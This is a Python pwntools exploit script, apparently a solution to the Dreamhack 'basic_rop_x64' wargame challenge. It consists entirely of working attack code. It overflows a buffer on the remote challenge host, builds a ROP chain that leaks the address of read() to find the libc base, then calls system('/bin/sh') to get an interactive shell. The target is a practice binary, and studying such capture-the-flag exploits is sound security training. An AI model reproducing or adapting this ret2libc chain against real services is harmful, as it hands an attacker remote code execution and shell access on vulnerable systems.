from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = remote("host3.dreamhack.games", 13975)
e = ELF('./basic_rop_x64')
r = ROP(e)
libc = ELF('./libc.so.6', checksec=False)

read_plt = e.plt['read']
read_got = e.got['read']

write_plt = e.plt['write']
write_got = e.got['write']

main = e.symbols['main']

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

payload:bytes = b'A' * 0x48

payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

payload += p64(main)

p.send(payload)

p.recvuntil(b'A' * 0x40)
read = u64(p.recvn(6) + b'\x00' * 2)

lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

slog("read", read)
slog("system", system)
slog("libc base", lb)
slog("/bin/sh", binsh)

payload: bytes = b'A' * 0x48

payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
